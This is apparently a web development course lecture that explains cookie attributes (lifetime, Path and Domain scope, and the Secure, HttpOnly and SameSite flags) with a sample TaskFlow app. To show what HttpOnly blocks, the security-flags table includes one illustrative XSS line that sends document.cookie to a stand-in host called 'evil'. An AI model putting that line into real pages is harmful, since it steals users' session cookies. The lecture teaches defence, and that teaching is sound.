# Lecture 24.02 · Cookie Attributes: Lifetime, Scope, and the Three Security Flags

> **Section:** S24 · **Type:** 📖 Theory · **Track:** ★ Core · **Time:** ~40 minutes
> 🔗 Reference: MDN, "Set-Cookie"; web.dev, "SameSite cookies explained"

---

## 📇 The attribute card

```text
Set-Cookie: <name>=<value>; Expires=<date> | Max-Age=<seconds>; Path=<path>; Domain=<domain>; Secure; HttpOnly; SameSite=Strict|Lax|None
```

| Attribute | Default when absent | Meaning | TaskFlow uses |
|---|---|---|---|
| `Expires=<HTTP date>` | — | delete at that moment | (js-cookie's `expires: days` writes this) |
| `Max-Age=<seconds>` | — | delete after *n* s; **wins over `Expires`**; `0` or negative deletes now | the servlet API (S38) |
| *(neither)* | a **session cookie** | deleted when the browser session ends (note: "continue where you left off" browsers may restore them) | `JSESSIONID`, `tf_last_task` |
| `Path=/x` | the directory of the request URL | sent only for URLs under `/x`; **part of the cookie's identity** | always `/` |
| `Domain=example.com` | host-only (exactly the setting host) | also sent to **subdomains**. Omit it unless you need that. | omitted |
| `Secure` | off | sent only over HTTPS | on in production |
| `HttpOnly` | off | **invisible to JavaScript** (`document.cookie`) | `JSESSIONID` |
| `SameSite=Strict\|Lax\|None` | browsers treat a missing value as `Lax` | whether it's sent on **cross-site** requests | `Lax` |

## 1. Identity: name + domain + path

Two cookies with the same name but different paths are **two cookies**. To overwrite or delete one, you must use the **same path and domain** it was set with. That's 24.18's bug in one line.

## 2. The security flags, one threat each

| Flag | Stops | Doesn't stop |
|---|---|---|
| `Secure` | a network eavesdropper reading the cookie on HTTP (café Wi-Fi) | anything on HTTPS |
| `HttpOnly` | **XSS stealing the cookie** (`fetch('https://evil/?c=' + document.cookie)`) | XSS *using* the session from the victim's page (24.08) |
| `SameSite` | most **CSRF**: the browser doesn't attach the cookie to requests another site triggers | same-site attacks (a sibling subdomain), and old browsers |

## 3. `SameSite` in detail

"Site" means the registrable domain: `app.taskflow.com` and `admin.taskflow.com` are the **same site**, `evil.com` is not.

| Request from `evil.com` to `taskflow.com` | `Strict` | `Lax` | `None` (requires `Secure`) |
|---|---|---|---|
| the user clicks a link → top-level GET navigation | ❌ not sent | ✅ sent | ✅ |
| an auto-submitted `<form method="POST">` | ❌ | ❌ | ✅ |
| `<img src>`, `fetch`, `<iframe>` | ❌ | ❌ | ✅ |

- **`Lax`** is the right default for sessions. Following a link from an email keeps you logged in, but cross-site POSTs arrive without the cookie.
- **`Strict`** logs users "out" when they arrive from another site's link. Use it for very sensitive cookies (a banking step-up), not for the main session.
- **`None`** is for cookies that must work in cross-site contexts (an embedded widget). It requires `Secure`.

## 4. Size and count limits

Around 4096 bytes per cookie (name + value + attributes), and ~50 cookies per domain in practice. Remember that every byte is re-sent with every request: that's why `tf_list_prefs` uses short JSON keys (24.06).

## ✅ Recap

- Lifetime: `Max-Age` > `Expires` > session cookie.
- Identity: **name + domain + path**. Delete with the same path.
- `Secure` (network), `HttpOnly` (XSS theft), `SameSite` (CSRF): three different threats, three flags.
